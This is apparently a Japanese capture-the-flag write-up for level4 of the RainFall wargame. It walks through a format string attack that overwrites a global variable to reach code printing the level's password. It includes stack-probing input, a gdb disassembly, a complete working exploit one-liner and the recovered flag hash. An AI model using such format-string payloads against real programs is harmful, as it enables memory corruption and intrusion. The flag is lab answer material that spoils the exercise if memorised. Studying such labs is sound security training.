# level4

## 方針
level3と一緒
source.cを確認すると、if (m == 0x1025544)を突破すれば.passがcatしているコードに到達する。
format string attack行いmのアドレスを書き換える。

mのアドレスを指定し,16930116(0x1025544) 文字出力してあげれば0x40になる。

### AAAA の場所を確認
```
level4@RainFall:~$ ./level4
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070
```
上記から12番目のstackにprintfの引数があることがわかる。

### mのアドレスを確認する
```
(gdb) disass n
Dump of assembler code for function n:
....
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
....
```

### ans
mのアドレス: 0x08049810 4文字
フィールド幅: 16930112文字
書き込み先のスタックの位置: 12

```
(python -c 'import sys; sys.stdout.write("\x10\x98\x04\x08" + "%16930112x" + "%12$n")' ; cat) | ./level4
.....
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## memo

## format string attackとは
`printf(入力文字列)` の脆弱性を利用して特定のアドレスに`write`する。
これは`printf()` 入力を書式トークンを通さずに書式文字列として利用すると発生する。


[https://ja.wikipedia.org/wiki/書式文字列攻撃](https://ja.wikipedia.org/wiki/%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E5%88%97%E6%94%BB%E6%92%83)